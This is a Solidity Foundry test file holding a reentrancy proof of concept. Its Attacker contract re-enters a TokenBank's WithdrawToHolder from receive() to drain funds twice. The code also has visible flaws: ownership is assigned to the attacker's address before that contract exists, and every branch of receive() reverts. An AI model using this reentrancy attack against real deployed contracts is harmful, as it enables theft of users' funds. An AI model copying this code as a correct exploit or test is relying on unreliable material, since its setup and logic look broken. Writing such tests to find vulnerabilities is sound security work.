
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/Ownable.sol";

contract TestReentrancyTokenBank is Test {

    TokenBank public _contractUnderTest;
    
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new TokenBank();
        _contractUnderTest.initTokenBank();
        _contractUnderTest.changeOwner(address(_attacker));
        vm.prank(address(_attacker));
        _contractUnderTest.confirmOwner();
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal > 1 ether);
        vm.assume(attackVal < type(uint128).max / 2);
        

        vm.deal(address(_contractUnderTest), attackVal * 4); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 2);

        
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    TokenBank public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedVal;

    constructor(address victimAddress) { 
        victim = TokenBank(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        storedVal = val;
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        victim.WithdrawToHolder(address(this), storedVal);

        uint256 finalBalance = address(this).balance;
        if (finalBalance - initialSnapshot == 2 * storedVal) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            victim.WithdrawToHolder(address(this), storedVal);
            revert();
        } else {
            revert();
        }
    }
}
